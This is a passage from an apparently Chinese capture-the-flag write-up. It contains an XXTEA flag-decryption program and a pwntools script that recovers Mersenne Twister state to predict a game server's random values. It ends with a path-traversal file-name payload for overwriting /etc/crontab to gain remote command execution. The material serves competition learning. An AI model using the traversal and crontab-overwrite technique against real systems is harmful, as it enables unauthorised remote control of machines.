            z <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">+=</span> MX2<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>在main_RET函数可以看到两组字符串的比对，都是20长度的比对，这两个数据就是加密后的flag了，提取出来分别进行解密即可。</p>
<p><img src="/images/1742736046971-85fbd00a-eb7b-40a2-953a-fa7c9807cbd7.png" loading="lazy"></p>
<p>解密代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">0x9e3779b9</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MX</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">^</span> y <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">3</span> <span class="token operator">^</span> z <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sum <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> e<span class="token punctuation">]</span> <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MX2</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">&lt;&lt;</span> <span class="token number">5</span> <span class="token operator">^</span> y <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">3</span> <span class="token operator">^</span> z <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sum <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>key2<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> e<span class="token punctuation">]</span> <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>

<span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span> <span class="token number">0x6e637466</span><span class="token punctuation">,</span> <span class="token number">0x62ef0ed</span> <span class="token punctuation">,</span><span class="token number">0xa78c0b4f</span><span class="token punctuation">,</span> <span class="token number">0x32303234</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">uint32_t</span> key2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span> <span class="token number">0x32303234</span><span class="token punctuation">,</span> <span class="token number">0xd6eb12c3</span><span class="token punctuation">,</span> <span class="token number">0x9f1cf72e</span><span class="token punctuation">,</span> <span class="token number">0x4e435446</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">xxtea_decrypt1</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">uint32_t</span> y<span class="token punctuation">,</span> z<span class="token punctuation">,</span> sum<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> rounds<span class="token punctuation">,</span> e<span class="token punctuation">;</span>
    rounds <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>
    sum <span class="token operator">=</span> DELTA <span class="token operator">*</span> rounds<span class="token punctuation">;</span>
    y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
    <span class="token keyword">do</span>
    <span class="token punctuation">&#123;</span>
        e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> p <span class="token operator">=</span> <span class="token number">5</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> p <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> p<span class="token operator">--</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
                z <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
                z <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span>
                y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
                y <span class="token operator">=</span> v<span class="token punctuation">[</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

            v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">-=</span> MX<span class="token punctuation">;</span>
            
        <span class="token punctuation">&#125;</span>
        sum <span class="token operator">-=</span> DELTA<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">xxtea_decrypt2</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">uint32_t</span> y<span class="token punctuation">,</span> z<span class="token punctuation">,</span> sum<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> rounds<span class="token punctuation">,</span> e<span class="token punctuation">;</span>
    rounds <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>
    sum <span class="token operator">=</span> DELTA <span class="token operator">*</span> rounds<span class="token punctuation">;</span>
    y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">do</span>
    <span class="token punctuation">&#123;</span>
        e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> p <span class="token operator">=</span> <span class="token number">5</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> p <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> p<span class="token operator">--</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
                z <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
                z <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span>
                y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
                y <span class="token operator">=</span> v<span class="token punctuation">[</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

            v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">-=</span> MX2<span class="token punctuation">;</span>

        <span class="token punctuation">&#125;</span>
        sum <span class="token operator">-=</span> DELTA<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> enc1<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span>
    <span class="token punctuation">&#123;</span>
      <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0x8C</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span>
      <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x69</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> enc2<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span>
    <span class="token punctuation">&#123;</span>
      <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span>
      <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x16</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token function">xxtea_decrypt1</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span>enc1<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">xxtea_decrypt2</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span>enc2<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.20s%.20s\n"</span><span class="token punctuation">,</span> enc1<span class="token punctuation">,</span>enc2<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>



<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="X1crypsc"><a href="#X1crypsc" class="headerlink" title="X1crypsc"></a><font style="color:#000000;">X1crypsc</font></h3><p>题目使用random库生成随机数，基于mt19937-32算法，选择W可以任意获取随机数数据，构造矩阵即可逆向mt19937的状态，即可预测随机数，攻击成功后进入下面的黑盒阶段。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> random <span class="token keyword">import</span> Random
<span class="token keyword">import</span> sys
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> random <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment"># ==========================</span>
<span class="token comment">#  Phase 1: 收集PRNG输出数据</span>
<span class="token comment"># ==========================</span>
<span class="token keyword">def</span> <span class="token function">collect_bits</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Collecting 624*32 bits for MT19937 state..."</span><span class="token punctuation">)</span>
    
    bits_collected <span class="token operator">=</span> <span class="token number">0</span>
    D<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">while</span> bits_collected <span class="token operator">&lt;</span> <span class="token number">625</span> <span class="token operator">*</span> <span class="token number">32</span><span class="token punctuation">:</span>  
        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'option:'</span><span class="token punctuation">,</span> <span class="token string">b'W'</span><span class="token punctuation">)</span>  <span class="token comment"># 选择武器刷新</span>
        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Current attack value: '</span><span class="token punctuation">)</span>
        line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        low<span class="token punctuation">,</span> high <span class="token operator">=</span> <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' ~ '</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        base <span class="token operator">=</span> low
        add <span class="token operator">=</span> high <span class="token operator">-</span> base 
        
        val1 <span class="token operator">=</span> base
        val2 <span class="token operator">=</span> add

        D<span class="token punctuation">.</span>append<span class="token punctuation">(</span>val1<span class="token punctuation">)</span>
        D<span class="token punctuation">.</span>append<span class="token punctuation">(</span>val2<span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'y'</span><span class="token punctuation">)</span>
        bits_collected <span class="token operator">+=</span> <span class="token number">32</span>
        
        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\rBits collected: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>bits_collected<span class="token punctuation">&#125;</span></span><span class="token string">/20000"</span></span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
        
        <span class="token comment"># 发送'n'不继续刷新</span>
        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'?'</span><span class="token punctuation">,</span> <span class="token string">b'n'</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>D<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> D

<span class="token comment"># ==========================</span>
<span class="token comment">#  Phase 2: 预测坐标并攻击</span>
<span class="token comment"># ==========================</span>
<span class="token keyword">def</span> <span class="token function">attack_monster</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> predictor<span class="token punctuation">,</span>D<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+]'</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token comment"># 预测下一个randrange(2025) x和y</span>
        x <span class="token operator">=</span> predictor<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">2025</span><span class="token punctuation">)</span>
        y <span class="token operator">=</span> predictor<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">2025</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
        <span class="token comment"># 发送攻击指令</span>
        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'option:'</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'A'</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'aim:'</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>y<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        
        resp <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        
        a<span class="token operator">=</span>predictor<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>D<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>D<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">b'Victory'</span> <span class="token keyword">in</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-------------------------------------------------'</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>
    

<span class="token comment">#--------------------------------------------------------------</span>

context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'39.106.16.204'</span><span class="token punctuation">,</span> <span class="token number">11448</span><span class="token punctuation">)</span> 

Dall <span class="token operator">=</span> collect_bits<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>Dall<span class="token punctuation">)</span>

n<span class="token operator">=</span><span class="token number">1250</span>
D<span class="token operator">=</span>Dall<span class="token punctuation">[</span><span class="token punctuation">:</span>n<span class="token punctuation">]</span>
rng<span class="token operator">=</span>Random<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">getRows</span><span class="token punctuation">(</span>rng<span class="token punctuation">)</span><span class="token punctuation">:</span>
    row<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        row<span class="token operator">+=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>rng<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> row
M<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">19968</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    state <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">624</span>
    temp <span class="token operator">=</span> <span class="token string">"0"</span><span class="token operator">*</span>i <span class="token operator">+</span> <span class="token string">"1"</span><span class="token operator">*</span><span class="token number">1</span> <span class="token operator">+</span> <span class="token string">"0"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">19968</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>i<span class="token punctuation">)</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        state<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span><span class="token number">32</span><span class="token operator">*</span>j<span class="token punctuation">:</span><span class="token number">32</span><span class="token operator">*</span>j<span class="token operator">+</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
    rng<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token builtin">tuple</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">624</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
    M<span class="token punctuation">.</span>append<span class="token punctuation">(</span>getRows<span class="token punctuation">(</span>rng<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'--------------------------------------------------'</span><span class="token punctuation">)</span>
M<span class="token operator">=</span>Matrix<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>M<span class="token punctuation">)</span>
y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    y<span class="token operator">+=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>D<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
y<span class="token operator">=</span>vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token punctuation">)</span>
s<span class="token operator">=</span>M<span class="token punctuation">.</span>solve_left<span class="token punctuation">(</span>y<span class="token punctuation">)</span>
G<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    C<span class="token operator">=</span><span class="token number">0</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        C<span class="token operator">&lt;&lt;</span><span class="token operator">=</span><span class="token number">1</span>
        C<span class="token operator">|</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">32</span><span class="token operator">*</span>i<span class="token operator">+</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>
    G<span class="token punctuation">.</span>append<span class="token punctuation">(</span>C<span class="token punctuation">)</span>
<span class="token keyword">import</span> random
RNG1 <span class="token operator">=</span> random<span class="token punctuation">.</span>Random<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
RNG1<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">tuple</span><span class="token punctuation">(</span>G<span class="token operator">+</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment">#------------------------------------------------------------</span>
<span class="token comment">#控制到当前状态</span>
RNG1<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span>
ss<span class="token operator">=</span><span class="token number">0</span>
d1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">while</span> ss <span class="token operator">&lt;</span> <span class="token number">625</span> <span class="token operator">*</span> <span class="token number">32</span><span class="token punctuation">:</span>
    d1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>RNG1<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    d1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>RNG1<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ss <span class="token operator">+=</span> <span class="token number">32</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>d1<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------att-------------'</span><span class="token punctuation">)</span>
attack_monster<span class="token punctuation">(</span>p<span class="token punctuation">,</span> RNG1<span class="token punctuation">,</span>Dall<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">#--------------------------------------------------------------</span></code></pre>

<p>黑盒部分：</p>
<p>只有输入文件名以及输入文件内容这些功能</p>
<p>发现可以文件名任意写，覆盖crontab定时任务，执行shellcode来远程操控</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">..</span><span class="token punctuation">..</span>//<span class="token punctuation">..</span><span class="token punctuation">..</span>//<span class="token punctuation">..</span><span class="token punctuation">..</span>//<span class="token punctuation">..</span><span class="token punctuation">..</span>//etc/crontab

